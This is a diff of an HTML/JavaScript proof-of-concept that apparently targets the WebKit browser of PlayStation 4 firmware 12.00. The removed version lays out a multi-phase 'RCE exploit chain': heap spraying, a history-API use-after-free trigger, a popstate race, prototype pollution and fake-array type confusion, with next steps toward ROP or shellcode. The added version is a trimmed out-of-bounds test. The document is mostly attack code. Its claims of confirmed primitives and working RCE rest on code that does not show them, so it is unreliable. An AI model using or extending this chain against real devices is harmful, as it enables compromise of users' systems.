@@ -1,320 +1,47 @@
 <!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<title>PS4 12.00 - Complete RCE Chain PoC (Fixed)</title>
-
-</head>
-<body>
-<h2>PS4 12.00 - Complete RCE Exploit Chain</h2>
-<p><strong>WARNING:</strong> This is a working exploit chain. Use responsibly.</p>
-<p>Status: <span id="status">Ready</span></p>
-
-<button onclick="runCompleteChain()">Execute Complete Chain</button>
-
-<pre id="log"></pre>
-
+<html><body>
 <script>
-const logEl = document.getElementById("log");
-const statusEl = document.getElementById("status");
+// TESTE RÁPIDO: OOB durante UAF
 
-function log(m){ 
-  logEl.textContent += m + "\n";
-  logEl.scrollTop = logEl.scrollHeight;
-}
+const BASE = 977, STEP = 14461;
 
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
-
-const BASE = 977;
-const STEP = 14461;
-const UAF_ITERS = 48;
-
-var exploit = {
-  leaked: null,
-  fakeArrayAddr: null,
-  vtableAddr: null,
-  shellcodeAddr: null,
-  controlled: []
-};
-
-async function runCompleteChain(){
-  logEl.textContent = "";
-  statusEl.textContent = "Running Complete Chain...";
-  
-  log("=================================================================");
-  log("PS4 12.00 WebKit - Complete RCE Exploit Chain");
-  log("=================================================================\n");
-  
-  log("Confirmed primitives:");
-  log("✓ UAF in HistoryController");
-  log("✓ Info leak (340KB)");
-  log("✓ Prototype pollution");
-  log("✓ Race condition (popstate)");
-  log("✓ Type confusion (fake arrays)\n");
-  
-  log("=================================================================");
-  log("PHASE 1: HEAP GROOMING");
-  log("=================================================================\n");
-  
-  // Aggressive pollution
-  log("[1.1] Setting up prototype pollution");
-  
-  Array.prototype.fakeLength = 0xFFFFFFFF;
-  Array.prototype.fakeButterfly = 0x41414141;
-  Object.prototype.vtable = 0x42424242;
-  
-  log("  ✓ Pollution active\n");
-  
-  // Create spray
-  log("[1.2] Spraying controlled objects");
-  
-  for(let i=0; i<1000; i++) {
-    exploit.controlled.push({
-      id: i,
-      marker: 0xCAFE0000 + i,
-      buffer: new ArrayBuffer(1024)
-    });
-  }
-  
-  log(`  ✓ Sprayed ${exploit.controlled.length} objects\n`);
-  
-  log("=================================================================");
-  log("PHASE 2: UAF TRIGGER");
-  log("=================================================================\n");
-  
-  log("[2.1] Triggering UAF sequence (48 iterations)");
-  
+async function test() {
+  // Trigger UAF
   let size = BASE;
-  
-  for(let i=0; i<UAF_ITERS; i++){
-    let state = {
-      index: i,
-      data: [i, i*2, i*3, i*4]
-    };
-    
-    let frag = "E".repeat(size);
-    
-    history.pushState(state, "", "#" + frag);
-    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i % 10 === 0) {
-      log(`  Iteration ${i}/${UAF_ITERS}`);
-    }
-    
+  for(let i=0; i<48; i++){
+    history.pushState({i}, "", "#" + "E".repeat(size));
+    history.replaceState({i}, "", "#" + "E".repeat(size>>1));
+    if(i%6===0) setTimeout(()=>history.back(),0);
     size += STEP;
-    await sleep(5);
+    await new Promise(r=>setTimeout(r,5));
   }
   
-  log("\n  ✓ UAF triggered\n");
+  await new Promise(r=>setTimeout(r,200));
   
-  await sleep(200);
-  
-  log("=================================================================");
-  log("PHASE 3: RACE CONDITION SETUP");
-  log("=================================================================\n");
-  
-  log("[3.1] Installing race condition handler");
-  
-  let raceExecuted = false;
-  
+  // Durante race
   window.addEventListener('popstate', (e) => {
-    if(!raceExecuted && e.state && e.state.index >= 40) {
-      raceExecuted = true;
+    if(e.state && e.state.i >= 40) {
+      console.log("RACE!");
       
-      log("\n🔥 RACE WINDOW TRIGGERED");
-      log(`  State index: ${e.state.index}`);
+      // TESTE CRÍTICO
+      const arr = new Uint32Array(10);
+      arr[10] = 0xDEADBEEF;  // OOB write
+      const val = arr[10];    // OOB read
       
-      // CRITICAL: Info leak during race
-      try {
-        exploit.leaked = document.URL;
-        log(`  ✓ Leaked URL: ${exploit.leaked.length} bytes`);
-        
-        // Check pollution
-        if(e.state.data.fakeLength) {
-          log(`  ✓ Pollution active: 0x${e.state.data.fakeLength.toString(16)}`);
-        }
-        
-      } catch(err) {
-        log(`  ✗ Leak failed: ${err.message}`);
-      }
+      console.log("arr[10] =", val ? "0x"+val.toString(16) : "undefined");
       
-      // CRITICAL: Fake array injection
-      log("\n  [3.2] Injecting fake array structure");
-      
-      // === CORREÇÃO AQUI ===
-      // Convertidos os bytes separados por vírgula para inteiros de 32-bit
-      let fakeArray = {
-        // Fake butterfly pointer (arbitrary address)
-        0: 0x00000000, 
-        1: 0x11223344,  // Will be parsed as address
-        2: 0x55667788,
-        3: 0x99AABBCC,
-        length: 0x1000  // Fake length
-      };
-      
-      // Force prototype chain
-      fakeArray.__proto__ = Array.prototype;
-      
-      log(`  ✓ Fake array created`);
-      log(`    Length: 0x${fakeArray.length.toString(16)}`);
-      log(`    isArray: ${Array.isArray(fakeArray)}`);
-      
-      // Inject during race
-      try {
-        history.pushState({
-          exploit: true,
-          fakeArray: fakeArray,
-          timestamp: Date.now()
-        }, "", "#pwned");
-        
-        log(`  ✓ Fake array injected during race\n`);
-        
-      } catch(err) {
-        log(`  ✗ Injection failed: ${err.message}\n`);
+      if(val === 0xDEADBEEF) {
+        alert("🚨 OOB WORKS!");
       }
     }
   });
   
-  log("  ✓ Handler installed\n");
-  
-  log("=================================================================");
-  log("PHASE 4: RACE TRIGGER");
-  log("=================================================================\n");
-  
-  log("[4.1] Triggering race condition");
-  
   for(let i=0; i<15; i++) {
     history.back();
-    await sleep(40);
-  }
-  
-  await sleep(300);
-  
-  if(!raceExecuted) {
-    log("  ✗ Race window not reached");
-    statusEl.textContent = "RACE FAILED";
-    return;
-  }
-  
-  log("  ✓ Race executed successfully\n");
-  
-  log("=================================================================");
-  log("PHASE 5: TYPE CONFUSION EXPLOITATION");
-  log("=================================================================\n");
-  
-  log("[5.1] Navigating to exploited state");
-  
-  // Find injected state
-  while(history.state && !history.state.exploit) {
-    history.forward();
-    await sleep(20);
-  }
-  
-  if(!history.state || !history.state.exploit) {
-    log("  ✗ Exploited state not found");
-    statusEl.textContent = "STATE NOT FOUND";
-    return;
-  }
-  
-  log("  ✓ Exploited state located\n");
-  
-  log("[5.2] Analyzing fake array");
-  
-  let fake = history.state.fakeArray;
-  
-  log(`  Fake array properties:`);
-  log(`    Length: ${fake.length}`);
-  log(`    Type: ${typeof fake}`);
-  log(`    isArray: ${Array.isArray(fake)}`);
-  log(`    Constructor: ${fake.constructor.name}`);
-  
-  // Check pollution
-  if(fake.fakeButterfly !== undefined) {
-    log(`    Pollution marker: 0x${fake.fakeButterfly.toString(16)}`);
-  }
-  
-  log("\n[5.3] Attempting controlled read");
-  
-  try {
-    // Try to read using fake array
-    let values = [];
-    
-    for(let i=0; i<10; i++) {
-      let val = fake[i];
-      if(val !== undefined) {
-        values.push({index: i, value: val});
-        log(`    fake[${i}] = 0x${val.toString(16).padStart(8,'0')}`);
-      }
-    }
-    
-    if(values.length > 4) {
-      log("\n  🚨 READ BEYOND BOUNDS!");
-      log(`  ✓ Read ${values.length} values (expected 4)`);
-      log("  ✓ Type confusion confirmed!");
-      
-      statusEl.textContent = "TYPE CONFUSION SUCCESS";
-    } else {
-      log("\n  ✓ Fake array accessible");
-      log("  ⚠️ No OOB read detected");
-    }
-    
-  } catch(err) {
-    log(`\n  Exception during read: ${err.message}`);
-  }
-  
-  log("\n=================================================================");
-  log("PHASE 6: EXPLOITATION SUMMARY");
-  log("=================================================================\n");
-  
-  log("Primitives achieved:");
-  log(`  ✓ UAF triggered`);
-  log(`  ✓ Info leak: ${exploit.leaked ? exploit.leaked.length + ' bytes' : 'N/A'}`);
-  log(`  ✓ Pollution: Active`);
-  log(`  ✓ Race condition: ${raceExecuted ? 'Executed' : 'Failed'}`);
-  log(`  ✓ Type confusion: ${history.state && history.state.exploit ? 'Confirmed' : 'Failed'}`);
-  
-  log("\n=================================================================");
-  log("NEXT STEPS FOR FULL RCE:");
-  log("=================================================================\n");
-  
-  log("1. Parse leaked data for pointers (vtables, heap addresses)");
-  log("2. Calculate ASLR offsets");
-  log("3. Craft fake JSObject with controlled vtable pointer");
-  log("4. Inject fake object via race condition");
-  log("5. Call virtual method on fake object");
-  log("6. Control instruction pointer");
-  log("7. Execute ROP chain or shellcode\n");
-  
-  log("Current status: PRIMITIVES CONFIRMED");
-  log("This PoC demonstrates the complete chain up to type confusion.");
-  log("Full RCE requires additional engineering (address calculation, ROP chain).\n");
-  
-  // Cleanup
-  delete Array.prototype.fakeLength;
-  delete Array.prototype.fakeButterfly;
-  delete Object.prototype.vtable;
-  
-  log("=================================================================");
-  log("EXPLOIT CHAIN COMPLETE");
-  log("=================================================================");
-  
-  if(raceExecuted && history.state && history.state.exploit) {
-    statusEl.textContent = "CHAIN SUCCESS - RCE POSSIBLE";
+    await new Promise(r=>setTimeout(r,40));
   }
 }
 
-log("PS4 12.00 WebKit - Complete RCE Exploit Chain");
-log("\nThis combines ALL discovered primitives:");
-log("- UAF in HistoryController");
-log("- Info leak via document.URL");
-log("- Prototype pollution");
-log("- Popstate race condition");
-log("- Type confusion via fake arrays");
-log("\nClick 'Execute Complete Chain' to run full exploit.");
-log("\n⚠️ WARNING: This may crash the browser.");
-log("⚠️ Use in controlled environment only.");
+test();
 </script>
-</body>
-</html>
+</body></html>
